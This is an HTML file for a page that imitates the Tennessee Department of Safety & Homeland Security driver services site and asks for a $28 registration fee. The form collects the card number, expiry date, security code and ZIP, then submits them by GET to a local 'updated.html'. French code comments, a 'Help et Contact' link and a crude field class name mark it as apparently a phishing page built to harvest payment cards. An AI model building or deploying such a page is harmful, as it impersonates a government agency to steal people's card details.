<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dl.safety.tn.gov</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awersome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="site-header">
        <div class="header-top">
            <div class="tn-badge">
                <img src="images/logo_tn1.jpg" class="logo_tn1">
            </div>
            <div class="header-titles">
                <span class="title-main">Department of </span>
                <span class="title-sub">Safety & <br> Homeland Security</span>
            </div>
            <div class="separation"><span></span></div>
            <div class="header-service-badge">
                Driver Services <br> Division
            </div>
        </div>
        <div class="header-nav">
            <img src="images/logo_home.jpg" class="logo_home">
            <img src="images/logo_help.jpg" class="logo_help">
        </div>
    </header>
    <div class="breadcrumb-bar">
        <a href="https://dl.safety.tn.gov/_/#2" class="back-link"> < <i class="fa-solid fa-chevron-left"></i> Home </a>
    </div>
    <main class="payment-card">
        <!-- En-tete -->
        <h2>Regular Registration Fees</h2>
        <!-- Corps du formulaire -->
        <div class="card-body">
        <!-- Logos des cartes -->
            <div class="card-logos">
                <span class="logo-box visa"><img src="images/logo_visa.jpg" alt="VISA" title="VISA"></span>
                <span class="logo-box mastercard"><img src="images/logo_mc.jpg" title="MasterCard"></span>
                <span class="logo-box amex"><img src="images/logo_amex.jpg" title="American Express"></span>
                <span class="logo-box dcv"><img src="images/logo_dcv.jpg" title="Discover"></span>
            </div>
            <div class="card-logos">
                <span class="logo-box cb"><img src="images/logo_cb.jpg" title="Carte Bancaire"></span>
                <span class="logo-box jcb"><img src="images/logo_jcb.jpg" title="JCB"></span>
                <span class="logo-box up"><img src="images/logo_up.jpg" title="China UnionPay"></span>
                <span class="logo-box mv"><img src="images/logo_mv.jpg" title="Maestro / V Pay"></span>
            </div>
        </div>
        <form action="updated.html" method="get">
        
            <!-- payment amount -->
            <div class="form-group">
                <label>Fees amount</label>
                <div class="input-with-addon">
                    <span class="addon">$</span>
                    <input type="number" class="puta" value="28,00">
                </div>
            </div>
                    
            <!-- name on card -->
            <div class="form-group">
                <label>Name on card</label>
                <input type="text" required>
            </div>

            <!-- card number -->
            <div class="form-group">
                <label>Card number</label>
                <input type="text" required>
            </div>

            <!-- expiry date & security code -->
            <div class="form-row">
                <div class="form-group-half">
                    <label>Expiry date</label>
                    <input type="text" placeholder="MM / YY" required>
                </div>
                <div class="form-group-half">
                    <label>Security code</label>
                    <div class="input-with-icon">
                        <input type="text" required>
                        <i class="fa-solid fa-cicle-question">?</i>
                    </div>
                </div>
            </div>

            <!-- ZIP/Postal code -->
            <div class="form-group">
                <label>ZIP/Postal code</label>
                <div class="input-with-icon">
                    <input type="text" required>
                    <i class="fa-solid fa-cicle-question">?</i>
                </div>
            </div>

            <!-- Bouton de validation -->
            <button type="submit" class="pay-btn">
                <i class="fa-solid fa-lock"><img src="images/lock.jpg"></i>  Payment
            </button>
        </form>
    </main>
    <footer class="site-footer">
        <div class="footer-seal">
            <img src="images/logo_tn2.jpg" class="logo_tn2" width="10%">
        </div>
        <!-- <legend><img src="logo_tennessee.jpg"></legend> -->
        <div class="footer-links-grid">
            <a href="https://www.tn.gov/state-services">TN.gov Services</a>
            <a href="https://www.tn.gov/directory">TN.gov Directory</a>
            <a href="https://www.tn.gov/transparenttn">Transparent TN</a>
            <a href="https://www.tn.gov/web-policies/privacy-statement">Web Policies</a>
            <a href="https://www.tn.gov/about-tn/state-symbols">About Tennessee</a>
            <a href="https://www.tn.gov/humanrights/file-a-discrimination-complaint/title-vi-disclaimer">Title VI</a>
            <a href="https://www.tn.gov/web-policies/accessibility">Accessibility</a>
            <a href="https://help.tn.gov/tn">Help et Contact</a>
            <a href="https://www.tn.gov/survey">Survey</a>
        </div>
    </footer>
</body>
</html>
